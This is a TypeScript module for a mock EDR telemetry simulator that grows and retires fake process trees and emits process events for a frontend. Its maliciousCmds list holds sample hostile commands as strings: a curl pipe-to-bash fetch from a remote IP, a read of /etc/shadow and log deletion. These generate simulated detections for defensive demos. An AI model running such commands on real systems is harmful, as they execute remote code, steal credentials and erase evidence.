import { EventEmitter } from "events";
import { MOCK_PROCESS_TREES, ProcessTree, ProcessNode } from "./data/mockProcessTree";

// EventEmitter to sync process creation with Telemetry stream
export const edrEvents = new EventEmitter();

// Initial state starts empty so the background generator can populate it dynamically
export const globalStore = {
  trees: [] as ProcessTree[],
  version: 0,
  lastUpdate: new Date().toISOString(),
};

/**
 * Recursively search and remove a node with the given PID, including all its children.
 * If the root matches, the entire tree is removed.
 */
export const killProcess = (pid: number) => {
  // 1. Remove entire trees if the root is the target
  globalStore.trees = globalStore.trees.filter(t => t.root.pid !== pid);

  // 2. Prune children from remaining trees
  const prune = (node: ProcessNode) => {
    if (node.children) {
      // Remove the child if it matches
      node.children = node.children.filter(c => c.pid !== pid);
      // Recurse into remaining children
      node.children.forEach(prune);
    }
  };

  globalStore.trees.forEach(t => prune(t.root));
  
  // Update version and timestamp
  globalStore.version++;
  globalStore.lastUpdate = new Date().toISOString();
};

// --- EDR Pipeline Simulator ---

// 1. Process Growth & Telemetry Dispatcher
setInterval(() => {
  // A. Retirement Logic: Remove very old or too large trees to keep the system moving
  const treesToRetire: string[] = [];
  globalStore.trees = globalStore.trees.filter(tree => {
    const nodeCount = (n: ProcessNode): number => 1 + (n.children?.reduce((acc, c) => acc + nodeCount(c), 0) ?? 0);
    const count = nodeCount(tree.root);
    const ageMs = Date.now() - new Date(tree.root.timestamp).getTime();
    
    let shouldRetire = false;
    let retirementReason = '';
    
    // Auto-retire if too large (> 15 nodes) or too old (> 2 minutes)
    if (count > 15) {
      shouldRetire = true;
      retirementReason = 'size_limit';
    } else if (ageMs > 120000) {
      shouldRetire = true;
      retirementReason = 'age_limit';
    } else if (!tree.is_suspicious && Math.random() < 0.05) {
      // Small random chance to retire normal trees early
      shouldRetire = true;
      retirementReason = 'random_early';
    }
    
    if (shouldRetire) {
      treesToRetire.push(tree.tree_id);
      // Emit retirement event for frontend synchronization with detailed info
      edrEvents.emit('tree_retired', {
        tree_id: tree.tree_id,
        reason: retirementReason,
        timestamp: new Date().toISOString(),
        age_ms: ageMs,
        node_count: count
      });
    }
    
    return !shouldRetire;
  });

  // Update version if trees were retired
  if (treesToRetire.length > 0) {
    globalStore.version++;
    globalStore.lastUpdate = new Date().toISOString();
  }

  // B. Random Chance to Re-Seed if trees are low
  if (globalStore.trees.length < 6) {
     const template = MOCK_PROCESS_TREES[Math.floor(Math.random() * MOCK_PROCESS_TREES.length)];
     const newTree = JSON.parse(JSON.stringify(template));
     
     // Unique ID and varied Label
     newTree.tree_id = `${template.tree_id}-${Date.now()}`;
     const variants = ['Suspected', 'Potential', 'Active', 'Staged', 'Detected', 'Ongoing', 'Inbound'];
     newTree.label = `${variants[Math.floor(Math.random() * variants.length)]} ${template.label}`;
     
     // Randomize PIDs for the new tree
     const randomizePids = (n: ProcessNode) => {
        n.pid = Math.floor(Math.random() * 60000) + 1000;
        n.timestamp = new Date().toISOString(); // refresh timestamp
        n.children?.forEach(randomizePids);
     };
     randomizePids(newTree.root);
     globalStore.trees.push(newTree);
     
     // Update version for new tree
     globalStore.version++;
     globalStore.lastUpdate = new Date().toISOString();
     
     // Dispatch Root execution event
     edrEvents.emit('process_exec', {
        event_id: `ev-${Date.now()}`,
        timestamp: newTree.root.timestamp,
        pid: newTree.root.pid,
        ppid: newTree.root.ppid,
        uid: newTree.root.uid,
        executable_path: newTree.root.executable_path,
        command_line: newTree.root.command_line,
        event_type: 'PROCESS_EXEC'
     });
  }

  // C. Random Process Growth (More frequently deep or wide)
  if (globalStore.trees.length > 0) {
    const targetTree = globalStore.trees[Math.floor(Math.random() * globalStore.trees.length)];
    
    const getAllNodes = (node: ProcessNode): ProcessNode[] => {
      let result = [node];
      node.children?.forEach(c => result.push(...getAllNodes(c)));
      return result;
    };
    
    const candidates = getAllNodes(targetTree.root);
    // Prefer adding to deeper nodes
    const parent = candidates[candidates.length - 1]; 
    
    const newPid = Math.floor(Math.random() * 60000) + 1000;
    const isAnomalousCmd = Math.random() < 0.2;
    
    const maliciousPaths = ['/tmp/ext_sys', '/var/tmp/.sh', '/usr/bin/python3', '/tmp/.hidden_proc'];
    const maliciousCmds = ['curl -s http://1.1.1.1/p | bash', 'ip addr show; netstat -pan', 'cat /etc/shadow > /tmp/out', 'rm -rf /var/log/*'];
    
    const execPath = isAnomalousCmd ? maliciousPaths[Math.floor(Math.random() * maliciousPaths.length)] : `/usr/bin/${['ls', 'cat', 'awk', 'node', 'ps', 'grep', 'sed'][Math.floor(Math.random() * 7)]}`;
    const cmdLine = isAnomalousCmd ? maliciousCmds[Math.floor(Math.random() * maliciousCmds.length)] : `sys-maint --task ${newPid}`;

    if (!parent.children) parent.children = [];
    const newNode: ProcessNode = {
      pid: newPid,
      ppid: parent.pid,
      uid: parent.uid,
      executable_path: execPath,
      command_line: cmdLine,
      timestamp: new Date().toISOString()
    };
    parent.children.push(newNode);

    // Update version for tree growth
    globalStore.version++;
    globalStore.lastUpdate = new Date().toISOString();

    edrEvents.emit('process_exec', {
        event_id: `ev-${Date.now()}`,
        timestamp: newNode.timestamp,
        pid: newNode.pid,
        ppid: newNode.ppid,
        uid: newNode.uid,
        executable_path: newNode.executable_path,
        command_line: newNode.command_line,
        event_type: 'PROCESS_EXEC'
    });
  }

  // D. Background Activity Noise
  if (Math.random() < 0.7) {
      const procs = ['/usr/sbin/sshd', '/usr/bin/nginx', '/usr/bin/syslogd', '/lib/systemd/systemd-journald'];
      edrEvents.emit('activity', {
          event_id: `ev-noise-${Date.now()}`,
          timestamp: new Date().toISOString(),
          pid: Math.floor(Math.random() * 5000) + 100,
          event_type: Math.random() < 0.5 ? 'NETWORK_CONNECT' : 'FILE_OPEN',
          executable_path: procs[Math.floor(Math.random() * procs.length)],
          command_line: 'system background task'
      });
  }

}, 2500); // Pulse every 2.5 seconds



